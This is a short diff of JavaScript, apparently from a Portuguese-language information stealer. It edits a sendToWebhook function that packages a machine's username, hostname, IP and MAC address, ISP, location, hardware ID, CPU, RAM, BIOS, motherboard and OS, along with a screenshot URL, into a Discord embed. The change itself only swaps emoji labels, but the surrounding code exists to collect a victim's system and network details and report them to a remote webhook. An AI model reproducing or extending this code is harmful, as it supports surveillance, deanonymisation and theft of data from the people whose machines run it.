@@ -106,21 +106,21 @@ function getMacAddress() {
 
 async function sendToWebhook(user, sysInfo, netInfo, screenshotUrl) {
     const embed = {
-        title: "<:dr4g0n:1362932398102155475> Informações Do Sistema <:dr4g0n:1362932398102155475>",
+        title: "Informações Do Sistema",
         color: 0x250e80,
         fields: [
             {
-                name: "<:person_7:1183669254898319390> Usuário",
+                name: "<:user:1378150229769060422> Usuário",
                 value: `\`\`\`Nome: ${user}\nSistema: ${netInfo.hostname}\nUsuário: ${user}\`\`\``,
                 inline: false
             },
             {
-                name: "<:website99:1183901361163751514> Rede",
+                name: "<:world:1378143049288253460> Rede",
                 value: `\`\`\`IP: ${netInfo.ip}\nMAC: ${netInfo.mac}\nISP: ${netInfo.isp}\nRegião: ${netInfo.region} - ${netInfo.city}\`\`\``,
                 inline: false
             },
             {
-                name: "<:cpu1:1183905201275551817> Sistema",
+                name: "<:cpu1:1378078689601785876> Sistema",
                 value: `\`\`\`CPU: ${sysInfo.cpu}\nRAM: ${sysInfo.ram}\nHWID: ${sysInfo.hwid}\nMotherboard: ${sysInfo.motherboard}\nBIOS: ${sysInfo.bios}\nSom: ${sysInfo.sound}\nOS: ${sysInfo.os}\`\`\``,
                 inline: false
             }
